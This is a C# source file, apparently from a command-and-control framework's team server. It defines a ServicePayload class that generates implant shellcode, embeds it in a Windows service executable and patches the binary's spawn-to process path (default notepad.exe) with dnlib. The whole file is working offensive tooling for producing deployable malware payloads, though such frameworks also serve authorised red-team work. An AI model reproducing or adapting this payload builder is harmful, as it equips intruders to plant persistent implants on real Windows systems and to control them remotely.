using System.IO;
using System.Linq;
using System.Threading.Tasks;

using dnlib.DotNet;
using dnlib.DotNet.Emit;

using TeamServer.Handlers;

namespace TeamServer.Models
{
    public class ServicePayload : Payload
    {
        public ServicePayload(Handler handler, C2Profile c2Profile) : base(handler, c2Profile) { }
        
        public override async Task Generate()
        {
            var shellcode = new RawPayload(Handler, C2Profile);
            await shellcode.Generate();

            var svcBinary = await Utilities.GetEmbeddedResource("drone_svc.exe");
            
            var module = ModuleDefMD.Load(svcBinary);
            module.Resources.Add(new EmbeddedResource("drone", shellcode.Bytes));

            var type = module.Types.GetType("Service");
            var method = type.Methods.GetMethod("SpawnTo");

            var spawnTo = C2Profile.PostExploitation.SpawnTo;

            if (string.IsNullOrEmpty(spawnTo))
                spawnTo = @"C:\Windows\System32\notepad.exe";

            var instruction = method.Body.Instructions.First(i => i.OpCode == OpCodes.Ldstr);
            instruction.Operand = spawnTo;
            
            await using var ms = new MemoryStream();
            module.Write(ms);
            Bytes = ms.ToArray();
        }
    }
}